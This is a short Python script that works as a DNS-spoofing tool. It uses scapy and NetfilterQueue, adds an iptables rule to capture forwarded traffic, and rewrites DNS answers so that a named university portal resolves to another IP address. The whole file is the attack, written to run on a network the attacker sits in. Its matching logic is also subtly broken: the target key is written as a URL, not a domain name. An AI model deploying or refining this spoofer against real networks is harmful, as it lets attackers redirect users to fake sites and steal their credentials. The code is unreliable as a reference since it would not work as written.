import logging as log
import os
from scapy import all
from netfilterqueue import NetfilterQueue
from scapy.all import IP, DNSRR, DNS, UDP, DNSQR


class dns_spoofing:
    def __init__(self, hostDict, queueNum):
        self.hostDict = hostDict
        self.queueNum = queueNum
        self.queue = NetfilterQueue()

    def callBack(self, packet):
        scapyPacket = IP(packet.get_payload())
        if scapyPacket.haslayer(DNSRR):
            try:
                log.info(f'[original] {scapyPacket[DNSRR].summary()}')
                queryName = scapyPacket[DNSQR].qname
                if queryName in self.hostDict:
                    scapyPacket[DNS].an = DNSRR(rrname=queryName, rdata=self.hostDict[queryName])
                    scapyPacket[DNS].ancount = 1
                    del scapyPacket[IP].len
                    del scapyPacket[IP].chksum
                    del scapyPacket[UDP].len
                    del scapyPacket[UDP].chksum
                    log.info(f'[modified] {scapyPacket[DNSRR].summary()}')
                else:
                    log.info(f'[not modified] {scapyPacket[DNSRR].rdata}')
            except IndexError as error:
                log.error(error)
            packet.set_payload(bytes(scapyPacket))
            return packet.accept()

    def __call__(self):
        log.info("Snoofing….")
        os.system(f'iptables -I FORWARD -j NFQUEUE --queue-num {self.queueNum}')
        self.queue.bind(self.queueNum, self.callBack)
        try:
            self.queue.run()
        except KeyboardInterrupt:
            os.system(f'iptables -D FORWARD -j NFQUEUE --queue-num {self.queueNum}')
            log.info("[!] iptable rule flushed")


if __name__ == '__main__':
    hostDict = {
        b"https://portal.bgu.ac.il": "13.107.246.43"
    }
    queueNum = 1
    snoof = dns_spoofing(hostDict, queueNum)
    snoof()
